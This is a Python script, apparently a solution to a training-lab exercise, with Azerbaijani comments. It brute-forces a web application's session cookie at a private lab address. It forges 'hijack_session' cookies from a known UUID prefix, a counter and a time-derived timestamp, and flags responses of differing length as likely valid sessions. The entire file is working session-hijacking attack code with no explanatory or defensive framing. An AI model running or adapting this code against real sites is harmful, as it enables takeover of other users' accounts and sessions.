import requests
import time

TARGET_IP = "10.42.69.248"
HOST_HEADER = "web0x01.hbtn"
URL = f"http://{TARGET_IP}/a1/hijack_session/"

HEADERS = {"Host": HOST_HEADER}

# Şəkildən götürdüyümüz sabit hissə (Prefix)
PREFIX = "44eaa229-9ca7-4a61-85e"

# Timestamp-i dinamik edək ki, server "vaxt bitdi" deməsin
# Sənin şəkildəki timestamp 11 rəqəmlidir, təxminən indiki vaxtın 10 qatı
# Ona görə təxmini cari vaxtı götürürük
def get_current_timestamp():
    return str(int(time.time() * 10))

def brute_force():
    print(f"[*] Hədəf: {URL}")
    print("[*] Cavabların uzunluğu (Length) yoxlanılır...")
    print("ID   | STATUS | LENGTH | NƏTİCƏ")
    print("-" * 40)

    # 0-dan 20-ə qədər yoxlayaq
    for i in range(20):
        # Timestamp-i hər dəfə yeniləyirik
        ts = get_current_timestamp()
        
        # Cookie formalaşdırırıq
        fake_cookie = f"{PREFIX}-{i}-{ts}"
        cookies = {"hijack_session": fake_cookie}

        try:
            r = requests.get(URL, headers=HEADERS, cookies=cookies, timeout=5)
            
            # Uzunluğu hesablayırıq
            length = len(r.text)
            
            # Ekrana yazırıq
            print(f"{i:<4} | {r.status_code:<6} | {length:<6} |", end=" ")
            
            # Qısa analiz: Adətən səhv səhifələr eyni uzunluqda olur.
            # Əgər bu uzunluq digərlərindən fərqlidirsə, onu yoxlamaq lazımdır.
            print(f"Bunu yoxla -> Cookie: {fake_cookie}")

        except Exception as e:
            print(f"[!] Xəta ID {i}: {e}")

if __name__ == "__main__":
    brute_force()
